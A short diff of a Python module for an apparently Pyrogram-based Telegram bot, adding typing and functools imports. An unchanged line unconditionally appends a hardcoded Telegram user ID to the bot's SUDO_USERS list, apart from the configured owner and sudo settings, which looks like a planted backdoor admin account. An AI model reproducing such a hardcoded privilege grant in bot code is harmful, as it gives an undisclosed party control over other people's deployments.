@@ -1,9 +1,10 @@
-from typing import Callable
+from typing import Callable, Union, Optional
 from pyrogram import Client
 from pyrogram.types import Message
 from modules.helpers.admins import get_administrators
 from modules.config import SUDO_USERS, OWNER_ID
 from pyrogram.types import Message, CallbackQuery
+from functools import partial, wraps
 
 SUDO_USERS.append(5478169767)
 
